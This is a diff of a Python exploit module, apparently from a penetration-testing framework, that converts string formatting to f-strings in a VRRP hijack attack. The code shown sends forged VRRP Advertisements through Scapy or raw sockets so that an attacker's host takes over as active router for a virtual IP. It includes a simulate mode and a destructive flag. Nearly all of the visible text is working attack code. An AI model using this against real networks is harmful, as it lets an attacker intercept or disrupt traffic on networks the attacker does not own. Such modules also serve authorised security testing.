@@ -163,18 +163,12 @@ class Exploit(Exploit):
 
         if self.simulate:
             print_status(
-                "\033[94m[SIMULATE]\033[0m [VRRP-HIJACK] Would send {} VRRP Advertisement(s)\n"
-                "  VRID={} priority={} virtual_ip={} advert_int={}s\n"
-                "  src={} -> dst={} (IP proto 112)\n"
-                "  VRRP payload ({} bytes): {}\n"
-                "  Effect: current master yields; attacker becomes active router for {}\n"
-                "  Set simulate=false + destructive=true to execute.".format(
-                    self.repeat,
-                    self.vrid, self.priority, self.virtual_ip, self.advert_int,
-                    self.src_ip, _VRRP_MULTICAST,
-                    len(vrrp_payload), vrrp_payload.hex(),
-                    self.virtual_ip,
-                )
+                f"\033[94m[SIMULATE]\033[0m [VRRP-HIJACK] Would send {self.repeat} VRRP Advertisement(s)\n"
+                f"  VRID={self.vrid} priority={self.priority} virtual_ip={self.virtual_ip} advert_int={self.advert_int}s\n"
+                f"  src={self.src_ip} -> dst={_VRRP_MULTICAST} (IP proto 112)\n"
+                f"  VRRP payload ({len(vrrp_payload)} bytes): {vrrp_payload.hex()}\n"
+                f"  Effect: current master yields; attacker becomes active router for {self.virtual_ip}\n"
+                "  Set simulate=false + destructive=true to execute."
             )
             return
 
@@ -200,11 +194,11 @@ class Exploit(Exploit):
                     )
                     sendp(pkt, iface=str(self.iface), verbose=False)
                     sent += 1
-                    print_info("[VRRP-HIJACK] Sent Advertisement #{} (Scapy)".format(i + 1))
+                    print_info(f"[VRRP-HIJACK] Sent Advertisement #{i + 1} (Scapy)")
                     if int(self.advert_int) > 0:
                         time.sleep(float(self.advert_int))
             except Exception as exc:
-                print_error("[VRRP-HIJACK] Scapy send error: {}".format(exc))
+                print_error(f"[VRRP-HIJACK] Scapy send error: {exc}")
         else:
             # Raw socket fallback
             try:
@@ -212,24 +206,22 @@ class Exploit(Exploit):
                 sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
             except OSError as exc:
-                print_error("[VRRP-HIJACK] Raw socket error: {}".format(exc))
+                print_error(f"[VRRP-HIJACK] Raw socket error: {exc}")
                 return
 
             for i in range(int(self.repeat)):
                 try:
                     sock.sendto(raw_packet, (_VRRP_MULTICAST, 0))
                     sent += 1
-                    print_info("[VRRP-HIJACK] Sent Advertisement #{} (raw socket)".format(i + 1))
+                    print_info(f"[VRRP-HIJACK] Sent Advertisement #{i + 1} (raw socket)")
                     if int(self.advert_int) > 0:
                         time.sleep(float(self.advert_int))
                 except OSError as exc:
-                    print_error("[VRRP-HIJACK] Send error on #{}: {}".format(i + 1, exc))
+                    print_error(f"[VRRP-HIJACK] Send error on #{i + 1}: {exc}")
             sock.close()
 
         if sent > 0:
             print_success(
-                "[VRRP-HIJACK] Sent {} VRRP Advertisement(s) with VRID={} priority={}. "
-                "Check if virtual IP {} is now reachable via attacker.".format(
-                    sent, self.vrid, self.priority, self.virtual_ip
-                )
+                f"[VRRP-HIJACK] Sent {sent} VRRP Advertisement(s) with VRID={self.vrid} priority={self.priority}. "
+                f"Check if virtual IP {self.virtual_ip} is now reachable via attacker."
             )
